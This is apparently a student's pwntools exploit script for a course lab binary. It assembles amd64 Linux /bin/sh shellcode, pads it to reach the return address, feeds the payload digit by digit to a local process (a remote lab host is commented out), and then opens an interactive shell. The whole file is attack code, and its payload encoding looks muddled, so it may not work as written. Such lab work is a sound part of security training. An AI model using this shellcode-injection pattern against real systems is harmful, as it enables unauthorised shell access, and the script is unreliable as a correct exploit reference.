from pwn import *

context.arch = "amd64"

# Shell call code
SHELLCODE = asm(shellcraft.amd64.linux.sh())
print("The shellcode payload in bytes is: ", (SHELLCODE))
print("")
SHELLCODE = unpack(SHELLCODE, 'all')
print("The shellcode payload in integers is: ", (SHELLCODE))
print("")

#  Paddingn to  stage shellcode at RIP
PADDING = "5"*14
print("Shellcode stack return address offset padding is: ", PADDING)
print("")

# Payload
payload = (PADDING + str( SHELLCODE))
print("The final payload is: ", payload)
print("")

# Start a local process
#p = gdb.debug("./lab2-3.bin")
p = process("./lab2-3.bin")

# Start a remote process
#p = remote("csc748.hostbin.org", 7023)

# Receive and print response
response = p.recvuntil('the list')
print(response.decode('utf-8'))

# Send payload
for x in str(payload):
	# Receive and print  response
	response = p.recvuntil("Enter a number:")
	print(response.decode('utf-8'))
	#print(x)
	#input = str(x)
	p.sendline(x)
	#p.interactive()

p.sendline(str(-1))

# Switch to interactive
p.interactive()
